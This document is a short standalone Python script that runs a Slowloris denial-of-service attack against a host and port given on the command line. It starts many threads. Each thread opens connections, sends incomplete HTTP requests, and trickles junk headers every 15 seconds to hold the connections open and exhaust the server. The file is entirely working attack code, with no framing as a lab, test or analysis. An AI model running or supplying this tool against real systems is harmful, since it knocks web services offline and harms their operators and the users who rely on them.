#!/usr/bin/env python3
import sys, time, threading, socket, random

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

def slowloris():
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            while running:
                sock.send(f"X-Header: {random.randint(0, 1000)}\r\n".encode())
                time.sleep(15)
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=slowloris).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
